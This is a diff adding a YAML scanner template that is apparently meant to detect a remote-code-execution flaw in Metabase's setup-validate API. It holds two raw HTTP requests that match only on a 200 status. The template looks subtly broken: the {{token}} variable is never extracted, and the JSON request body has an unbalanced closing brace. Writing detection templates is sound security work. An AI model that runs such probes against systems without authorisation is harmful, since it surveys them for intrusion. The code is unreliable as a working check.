@@ -1,0 +1,34 @@
+id: poc-yaml-metabase-setup-validate-rce
+
+info:
+  name: poc-yaml-metabase-setup-validate-rce
+  author: Chaitin
+  severity: medium
+  tags: xray-converted,rce
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=140
+
+http:
+  - raw:
+      - |
+        GET /api/session/properties HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /api/setup/validate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"token":"{{token}}","details":{"is_on_demand":false,"is_full_sync":false,"is_sample":false,"cache_ttl":null,"refingerprint":true,"auto_run_queries":true,"schedules":{},"details":{},"name":"test","engine":"mysql"}}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
